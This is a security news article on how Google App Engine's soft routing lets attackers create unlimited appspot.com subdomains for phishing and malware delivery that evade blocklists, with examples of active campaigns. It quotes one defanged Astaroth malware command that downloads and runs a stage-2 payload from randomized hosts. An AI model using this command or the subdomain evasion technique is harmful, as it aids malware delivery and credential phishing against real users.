@@ -1,0 +1,237 @@
+
+	   
+
+
+A newly discovered technique by a researcher shows how Google's App Engine domains can be abused to deliver phishing and malware while remaining undetected by leading enterprise security products.
+
+Google App Engine is a cloud-based service platform for developing and hosting web apps on Google's servers.
+
+While reports of phishing campaigns leveraging enterprise cloud domains are nothing new, what makes Google App Engine infrastructure risky in how the subdomains get generated and paths are routed.
+
+
+1/1
+
+
+
+
+
+Skip Ad
+ 
+Continue watchingafter the adVisit Advertiser websiteGO TO PAGE.cnx-non-linear-ad-container .cnx-ad-bid-slot{position:absolute;top:0;left:0;grid-area:adslot;opacity:0;background:none;width:100%;height:100%}.cnx-non-linear-ad-container .cnx-ad-bid-slot.cnx-ad-bid-slot-selected{opacity:1;z-index:10}.cnx-non-linear-ad-container .cnx-ad-slot{display:flex;position:absolute;top:0;left:0;justify-content:center;align-items:center;width:100%;height:100%;overflow:hidden}.cnx-non-linear-ad-container .cnx-ad-slot video,.cnx-non-linear-ad-container video.cnx-ad-slot{background-color:unset}.cnx-ad-container .cnx-ad-bid-slot{position:absolute;top:0;left:0;grid-area:adslot;opacity:0;background:#f4f4f4;width:100%;height:100%}.cnx-ad-container .cnx-ad-bid-slot.cnx-ad-bid-slot-selected{opacity:1;z-index:10}.cnx-ad-container .cnx-ad-slot{display:flex;position:absolute;top:0;left:0;justify-content:center;align-items:center;width:100%;height:100%;overflow:hidden}.cnx-ad-container .cnx-ad-slot div{background-color:rgba(0,0,0,0) !important}.cnx-ad-container .cnx-ad-slot iframe{box-sizing:border-box;border:3px solid #fff !important;color-scheme:none}.cnx-ad-container .cnx-ad-slot iframe:not([id]){border:none !important}.cnx-ad-container .cnx-ad-slot-video-type iframe{border:none !important}.cnx-ad-container .cnx-ad-slot video,.cnx-ad-container video.cnx-ad-slot{background-color:#f4f4f4}Practically unlimited subdomains for one app
+
+Typically scammers use cloud services to create a malicious app that gets assigned a subdomain. They then host phishing pages there. Or they may use the app as a command-and-control (C2) server to deliver malware payload. 
+
+But the URL structures are usually generated in a manner that makes them easy to monitor and block using enterprise security products, should there be a need.
+
+For example, a malicious app hosted on Microsoft Azure services may have a URL structure like: https://example-subdomain.app123.web.core.windows.net/...
+
+Therefore, a cybersecurity professional could block traffic to and from this particular app by simply blocking requests to and from this subdomain. This wouldn't prevent communication with the rest of the Microsoft Azure apps that use other subdomains.
+
+It gets a bit more complicated, however, in the case of Google App Engine.
+
+Security researcher Marcel Afrahim demonstrated an intended design of Google App Engine's subdomain generator, which can be abused to use the app infrastructure for malicious purposes, all while remaining undetected.
+
+Google's appspot.com domain, which hosts apps, has the following URL structure:
+
+VERSION-dot-SERVICE-dot-PROJECT_ID.REGION_ID.r.appspot.com
+
+A subdomain, in this case, does not only represent an app, it represents an app's version, the service name, project ID, and region ID fields.
+
+But the most important point to note here is, if any of those fields are incorrect, Google App Engine won't show a 404 Not Found page, but instead show the app's "default" page (a concept referred to as soft routing).
+
+"Requests are received by any version that is configured for traffic in the targeted service. If the service that you are targeting does not exist, the request gets Soft Routed," states Afrahim, adding:
+
+"If a request matches the PROJECT_ID.REGION_ID.r.appspot.com portion of the hostname, but includes a service, version, or instance name that does not exist, then the request is routed to the default service, which is essentially your default hostname of the app."
+
+Essentially, this means there are a lot of permutations of subdomains to get to the attacker's malicious app. As long as every subdomain has a valid "project_ID" field, invalid variations of other fields can be used at the attacker's discretion to generate a long list of subdomains, which all lead to the same app.
+
+For example, as shown by Afrahim, both URLs below - which look drastically different, represent the same app hosted on Google App Engine.
+
+https://random123-random123-random123-dot-bad-app-2020.ue.r.appspot.com
+https://insertanythingyouwanthere-xyz123-xyz123-dot-bad-app-2020.ue.r.appspot.com
+
+"Verified by Google Trust Services" means trusted by everyone
+
+The fact that a single malicious app is now represented by multiple permutations of its subdomains makes it hard for sysadmins and security professionals to block malicious activity.
+
+But further, to a technologically unsavvy user, all of these subdomains would appear to be a "secure site." After all, the appspot.com domain and all its subdomains come with the seal of "Google Trust Services" in their SSL certificates.
+
+
+Google App Engine sites showing valid SSL certificate with "Verified by: Google Trust Services" text
+Source: Afrahim
+
+Even further, most enterprise security solutions such as Symantec WebPulse web filter automatically allow traffic to trusted category sites. And Google's appspot.com domain, due to its reputation and legitimate corporate use cases, earns an "Office/Business Applications" tag, skipping the scrutiny of web proxies.
+
+
+Automatically trusted by most enterprise security solutions
+
+On top, a large number of subdomain variations renders the blocking approach based on Indicators of Compromise (IOCs) useless.
+
+A screenshot of a test app created by Afrahim along with a detailed "how-to" demonstrates this behavior in action.
+
+In the past, Cloudflare domain generation had a similar design flaw that Astaroth malware would exploit via the following command wheen fetching stage 2 payload:
+ 
+
+%ComSpec% /c “echo GetObject(“script:hxxps://xsw%RANDOM%nnccccmd95c22[.]cloudflareworkers[.]com/.edgeworker-fiddle-init-preview/6a8db783ccc67c314de2767f33605caec2262527cbed408b4315c2e2d54cf0371proud-glade-92ec.ativadormasterplus.workers.dev/?09/”)” > %temp%\Lqncxmm:vbvvjjh.js && start wscript.exe %temp%\Lqncxmm:vbvvjjh.js”
+
+This would essentially launch a Windows command prompt and put a random number replacing %RANDOM% making the payload URL truly dynamic.  
+
+"And now you have a script that downloads the payload from different URL hostnames each time is run and would render the network IOC of such hypothetical sample absolutely useless. The solutions that rely on single run on a sandbox to obtain automated IOC would therefore get a new Network IOC and potentially new file IOC if script is modified just a bit," said the researcher.
+
+
+Delivering malware via Google App Engine subdomain variations while bypassing IOC blocks
+
+Actively exploited for phishing attacks
+
+Security engineer and pentester Yusuke Osumi tweeted last week how a Microsoft phishing page hosted on the appspot.com subdomain was exploiting the design flaw Afrahim has detailed.
+
+Osumi additionally compiled a list of over 2,000 subdomains generated dynamically by the phishing app—all of them leading to the same phishing page.
+
+
+Active exploitation of Google App Engine subdomains in phishing attacks
+Source: Twitter
+
+This recent example has shifted the focus of discussion from how Google App Engine's flaw can be potentially exploited to active phishing campaigns leveraging the design flaw in the wild.
+
+"Use a Google Drive/Service phishing kit on Google’s App Engine and normal user would not just realize it is not Google which is asking for credentials," concluded Afrahim in his blog post.
+
+Update 23-Sep-2020:
+
+Some readers working in enterprise environments have notified BleepingComputer of observing additional phishing attacks actively leveraging Google App Engine.
+
+Shown below is what looks like an Excel online spreadsheet hosted on the appspot.com domain. Link to the "spreadsheet" was contained in a phishing email sent to the company's employees.
+
+
+Excel phishing campaign using the appspot domain
+Source: BleepingComputer
+
+ 
+
+	   
+
+.ia_ad {
+    background-color: #f0f6ff;
+    width: 95%;
+    max-width: 800px;
+    margin: 15px auto;
+    border-radius: 8px;
+    border: 1px solid #d6ddee;
+    display: flex;
+    align-items: stretch;
+    padding: 0;
+    overflow: hidden;
+}
+
+.ia_lef {
+    flex: 1;
+    max-width: 200px;
+    height: auto;
+    display: flex;
+    align-items: stretch;
+}
+
+.ia_lef a {
+    display: flex;
+    width: 100%;
+    height: 100%;
+}
+
+
+.ia_lef a img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    border-radius: 8px 0 0 8px;
+    margin: 0;
+    display: block;
+}
+
+.ia_rig {
+    flex: 2;
+    padding: 10px;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+}
+
+.ia_rig h2 {
+    font-size: 17px !important;
+    font-weight: 700;
+    color: #333;
+    line-height: 1.4;
+    font-family: Georgia, "Times New Roman", Times, serif;
+    margin: 0 0 14px 0;
+}
+
+.ia_rig p {
+    font-weight: bold;
+    font-size: 14px;
+    margin: 0 0 clamp(6px, 2vw, 14px) 0;
+}
+
+.ia_button {
+    background-color: #FFF;
+    border: 1px solid #3b59aa;
+    color: black;
+    text-align: center;
+    text-decoration: none;
+    border-radius: 8px;
+    display: inline-block;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+    padding: 10px 20px;
+    width: fit-content;
+}
+
+.ia_button a {
+    text-decoration: none;
+    color: inherit;
+    display: block;
+}
+
+@media (max-width: 600px) {
+    .ia_ad {
+        flex-direction: column;
+        align-items: center;
+    }
+
+    .ia_lef {
+        max-width: 100%;
+    }
+
+    .ia_lef a img {
+        border-radius: 8px 8px 0 0;
+    }
+
+
+    .ia_rig {
+        padding: 15px;
+        width: 100%;
+    }
+
+    .ia_button {
+        width: 100%;
+	margin: 0px auto;
+    }
+}
+
+    
+        
+            
+    
+    
+        Red Report 2025: Analyzing the Top ATT&CK Techniques Used by 93% of Malware 
+Malware targeting password stores surged 3X as attackers executed stealthy Perfect Heist scenarios, infiltrating and exploiting critical systems.
+Discover the top 10 MITRE ATT&CK techniques behind 93% of attacks and how to defend against them.
+        Read the Red Report 2025
+    
+
+
+           
+          
+            Related Articles:
+	     ChainLink Phishing: How Trusted Domains Become Threat VectorsInside a Real Clickfix Attack: How This Social Engineering Hack UnfoldsHow attackers are still phishing "phishing-resistant" authenticationGoogle sues to disrupt BadBox 2.0 botnet infecting 10 million devicesGoogle confirms data breach exposed potential Google Ads customers' info
+	  
+ 
+	  
